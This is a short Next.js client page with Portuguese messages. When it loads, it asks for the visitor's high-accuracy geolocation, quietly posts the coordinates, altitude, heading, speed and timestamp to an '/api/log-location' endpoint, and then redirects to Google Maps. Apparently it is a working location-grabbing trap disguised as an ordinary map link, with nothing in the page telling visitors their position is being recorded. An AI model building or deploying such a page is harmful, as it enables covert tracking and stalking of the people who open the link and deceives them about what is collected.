"use client";

import { useEffect } from "react";

export default function HomePage() {
  const handleClick = () => {
    if (!navigator.geolocation) {
      alert("Geolocalização não suportada");
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const {
          latitude,
          longitude,
          altitude,
          accuracy,
          altitudeAccuracy,
          heading,
          speed,
        } = position.coords;

        const timestamp = position.timestamp;

        try {
          await fetch("/api/log-location", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              latitude,
              longitude,
              altitude,
              accuracy,
              altitudeAccuracy,
              heading,
              speed,
              timestamp,
            }),
          });
        } catch (err) {
          console.error("Erro ao enviar dados de localização:", err);
        }

        // Redireciona para o Google Maps
        window.location.href = `https://www.google.com/maps?q=${latitude},${longitude}`;
      },
      (error) => {
        alert("Erro ao obter localização: " + error.message);
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0,
      },
    );
  };

  useEffect(() => {
    handleClick();
  }, []);

  return null;
}
